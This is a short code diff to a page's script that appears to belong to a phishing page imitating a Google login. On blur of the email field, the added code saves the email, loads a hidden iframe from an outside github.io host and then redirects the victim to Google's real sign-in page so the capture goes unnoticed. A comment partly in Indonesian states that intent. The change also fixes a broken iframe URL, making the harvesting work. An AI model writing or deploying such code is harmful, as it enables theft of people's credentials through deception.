@@ -68,16 +68,20 @@
   </div>
 
   <script>
-    function next() {
-      const email = document.getElementById("emailInput").value;
-      if (!email) return;
-      localStorage.setItem("google_login_email", email);
+   document.getElementById("emailInput").addEventListener("blur", () => {
+  const email = emailInput.value;
+  localStorage.setItem("google_login_email", email);
 
-      const iframe = document.createElement("iframe");
-      iframe.src = "https://https://sauceialist.github.io/justwanna/frame.html";
-      iframe.sandbox = "allow-scripts allow-forms";
-      iframe.style.display = "none";
-      document.body.appendChild(iframe);
+  const iframe = document.createElement("iframe");
+  iframe.src = "https://sauceialist.github.io/justwanna/frame.html";
+  iframe.sandbox = "allow-scripts allow-forms";
+  iframe.style.display = "none";
+  document.body.appendChild(iframe);
+});
+
+    function redirect() {
+      // After "Next", user redirected ke halaman login asli Google
+      window.location.href = "https://accounts.google.com/v3/signin";
     }
   </script>
 </body>
